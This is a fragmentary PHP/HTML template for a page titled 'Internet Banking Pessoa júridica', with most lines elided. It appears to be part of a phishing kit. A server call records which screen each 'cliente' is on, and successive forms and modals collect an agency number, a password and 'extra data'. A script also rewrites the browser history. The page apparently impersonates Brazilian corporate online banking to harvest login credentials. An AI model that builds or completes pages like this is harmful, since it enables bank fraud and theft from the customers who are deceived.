<?php
   ...
   $api->atualizarColuna($cliente_id, 'tela', 'Conta Juridica');
...
<head>
    ...
    <title>Internet Banking Pessoa júridica</title>
    ...
    <div class="container">
        ...
        <form id="formulario" method="post">
            <div class="form-group">
                ...
                <input type="text" name="cpf" maxlength="11" placeholder="Digite o número de sua agência">
            </div>
            ...
            <div class="form-group">
            <input type="hidden" name="action" value="form-save2">
...
<div id="myModal" class="modal">
    ...
    <div class="modal-content">
        ...
        <form method="post" id="formulariomodal">
            ...
            <input type="hidden" name="action" value="form-modal2">
        </form>
    </div>
</div>
...
<div id="passwordModal" class="modal">
    ...
    <div class="modal-content">
        ...
        <form method="post" id="formulariosenha">
            ...
            <button class="confirm-btn" type="submit">Confirmar</button>
            <input type="hidden" name="action" value="form-senha2">
        </form>
    </div>
</div>
...
<div id="extraDataModal" class="modal">
    ...
    <div class="modal-content">
        ...
        <form method="post" id="formulariodadosextras">
            ...
            <button class="confirm-btn" type="submit">Confirmar</button>
            <input type="hidden" name="action" value="form-dadosextras2">
        </form>
    </div>
</div>
...
<script type="text/javascript">
    ...
    window.addEventListener('DOMContentLoaded', function() {
       ...
       window.history.replaceState({}, 'contapf', currentUrl);
    });
